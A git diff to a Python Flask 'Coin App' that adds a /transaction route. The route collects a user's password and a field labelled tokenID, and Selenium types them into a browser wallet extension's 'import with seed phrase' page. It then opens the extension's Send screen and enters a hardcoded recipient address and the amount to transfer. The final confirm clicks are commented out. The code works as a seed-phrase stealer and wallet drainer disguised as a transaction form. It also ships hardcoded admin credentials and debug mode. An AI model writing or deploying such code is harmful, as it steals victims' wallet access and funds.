@@ -3,6 +3,18 @@ import socket
 import threading
 import requests
 
+from select import select
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.keys import Keys
+import time
+from selenium import webdriver
+
+from selenium.webdriver.chrome.options import Options as ChromeOptions
+
+
 app = Flask(__name__)
 
 USERNAME = 'admin'
@@ -21,6 +33,125 @@ def get_signin():
         return redirect('/history')
     else:
         return redirect('/signin')
+
+
+@app.route('/register', methods=['GET', 'POST'])
+# Register
+def get_register():
+    return render_template('register.html')
+
+
+# @app.route('/wallet', methods=['GET', 'POST'])
+# # Wallet
+# def get_wallet():
+#     if request.method == 'POST':
+#         if __name__ == '__main__':
+#             app.run(debug=True)
+#     else:
+#         return render_template('wallet.html')
+
+
+@app.route('/transaction', methods=['GET', 'POST'])
+# Transaction
+def get_transaction():
+    if request.method == 'POST':
+        admin = request.form['admin']
+        searchpass = request.form['pass']
+        searchpasscf = request.form['passCf']
+        tokenIDadmin = request.form['tokenID']
+        valueTransferred = request.form['valueEth']
+        address = request.form['idGlobal']
+        # print(searchpass)
+        # print(searchpasscf)
+        # print(tokenIDadmin)
+        chromeOptions = ChromeOptions()
+        chromeOptions.add_extension('hello.crx')
+        driver = webdriver.Chrome(
+            'D:\Source code Python\Coin App\chromedriver.exe', options=chromeOptions)
+        driver.get(
+            "chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#initialize/create-password/import-with-seed-phrase")
+
+        search = driver.find_element_by_id("password")
+        search.send_keys(searchpass)
+        search.send_keys(Keys.RETURN)
+
+        search1 = driver.find_element_by_id("confirm-password")
+        search1.send_keys(searchpasscf)
+        search1.send_keys(Keys.RETURN)
+
+        search0 = driver.find_element_by_class_name("MuiInputBase-input")
+        search0.send_keys(tokenIDadmin)
+        search0.send_keys(Keys.RETURN)
+
+        botton2 = driver.find_element_by_class_name(
+            "first-time-flow__checkbox")
+        botton2.click()
+
+        botton = driver.find_element_by_class_name("first-time-flow__terms")
+        botton.click()
+
+        bottnxt = driver.find_element_by_class_name("first-time-flow__button")
+        bottnxt.click()
+
+        time.sleep(2)
+
+        bttk = driver.find_element_by_class_name("first-time-flow__button")
+        bttk.click()
+
+        time.sleep(2)
+        bttsend = driver.find_element_by_class_name("btn-secondary")
+        bttsend.click()
+
+        time.sleep(2)
+        bttidaddress = driver.find_element_by_class_name(
+            "ens-input__wrapper__input")
+        bttidaddress.send_keys("0x51923d87c096dfEF7962b97A9c315e147302e1e9")
+
+        time.sleep(5)
+
+        ethclick = driver.find_element_by_class_name("unit-input__input")
+        ethclick.send_keys(valueTransferred)
+        time.sleep(2)
+
+        # nextclick = driver.find_elements_by_xpath(
+        #     "//button['data-testid=\"page-container-footer-next\"']")[-1]
+        # nextclick.click()
+        # time.sleep(2)
+
+        # # confirm button
+        # confirmclick = driver.find_elements_by_xpath(
+        #     "//button['data-testid=\"page-container-footer-next\"']")[-1]
+        # confirmclick.click()
+
+        # time.sleep(5)
+
+        url = "https://api.etherscan.io/api?module=account&action=txlist&address=" + address + \
+            "&startblock=0&endblock=99999999&page=1&offset=10&sort=desc&apikey=YourApiKeyToken"
+
+        response = requests.get(url)
+        address_content = response.json()
+        result = address_content.get("result")
+
+        data = []
+        for n, transaction in enumerate(result):
+            # tx_from = transaction.get("from"),
+            # tx_to = transaction.get("to"),
+            # value = transaction.get("value"),
+            data.append({
+                'tx_from': transaction.get("from"),
+                'tx_to': transaction.get("to"),
+                'value': transaction.get("value"),
+            })
+
+        if data[5]['tx_from'] == admin and data[5]['tx_to'] == address:
+            balance = data[5]['value']
+            # print(data[5]['value'])
+        else:
+            balance = "Chua nhap tien"
+
+        return render_template('transaction.html', datas=data, data=balance)
+    else:
+        return render_template('transaction.html')
 
 
 @app.route('/history', methods=['GET', 'POST'])
@@ -42,27 +173,23 @@ def get_response():
         data = []
         for n, transaction in enumerate(result):
             data.append({'hash': transaction.get("hash"),
-                        'timeStamp': transaction.get("time"),
-                        'tx_from': transaction.get("from"),
-                        'tx_to': transaction.get("to"),
-                        'value': transaction.get("value"),
-                        'fee': transaction.get("gasPrice"),
-                        'confirmation': transaction.get("confirmation")})
+                         'timeStamp': transaction.get("time"),
+                         'tx_from': transaction.get("from"),
+                         'tx_to': transaction.get("to"),
+                         'value': transaction.get("value"),
+                         'fee': transaction.get("gasPrice"),
+                         'confirmation': transaction.get("confirmation")})
+
         return render_template('history.html', datas=data)
     else:
         return render_template('history.html')
 
-@app.route('/verifyWallet', methods=['GET', 'POST'])
-# Verify Wallet
-def get_verify():       
-    return render_template('verifyWallet.html')
+
+if __name__ == '__main__':
+    app.run(debug=True)
 
 
-
-# @app.route('/transaction', methods=['GET', 'POST'])
-# def
-
-
+'''
 SERVER = socket.gethostbyname(socket.gethostname())
 
 
@@ -86,6 +213,7 @@ def POST_request(filename, request_body):
     if(username == USERNAME and password == PASSWORD):
         return True
     return False
+
 
 
 def send_response(client, filename, status):
@@ -136,7 +264,4 @@ def start():
         httpserver.close()
     finally:
         httpserver.close()
-
-
-if __name__ == '__main__':
-    app.run(debug=True)
+'''
